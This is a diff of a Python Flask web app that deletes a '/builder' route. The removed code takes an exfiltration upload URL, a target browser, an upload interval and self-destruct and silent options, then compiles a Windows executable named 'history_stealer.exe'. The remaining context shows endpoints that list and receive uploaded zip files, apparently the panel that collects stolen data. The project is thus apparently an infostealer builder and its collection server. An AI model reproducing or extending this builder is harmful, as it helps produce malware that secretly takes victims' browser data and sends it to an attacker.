@@ -32,38 +32,6 @@ def uploads():
     
     return render_template("uploads.html", zip_files=zip_files, unzipped_files=unzipped_files)
 
-@app.route("/builder", methods=["GET", "POST"])
-def builder():
-    if request.method == "POST":
-        # Get form data
-        upload_url = request.form.get("upload_url", "http://example.com/upload")
-        target_browser = request.form.get("target_browser", "2")
-        upload_interval = request.form.get("upload_interval", "0")
-        self_destruct = "1" if request.form.get("self_destruct") else "0"
-        silent = "1" if request.form.get("silent") else "0"
-
-        config = {
-            "upload_url": upload_url,
-            "target_browser": target_browser,
-            "upload_interval_hours": upload_interval,
-            "self_destruct": self_destruct,
-            "silent": silent
-        }
-
-        try:
-            if not check_mingw():
-                flash("MinGW-w64 not found. Please ensure it is installed.", "error")
-                return redirect(url_for("builder"))
-
-            generate_config_h(config)
-            compile_program(silent == "1")
-            flash("Build successful! Executable created: history_stealer/history_stealer.exe", "success")
-        except Exception as e:
-            flash(f"Build failed: {str(e)}", "error")
-
-        return redirect(url_for("builder"))
-
-    return render_template("builder.html")
 
 @app.route("/file_upload", methods=["POST"])
 def file_upload():
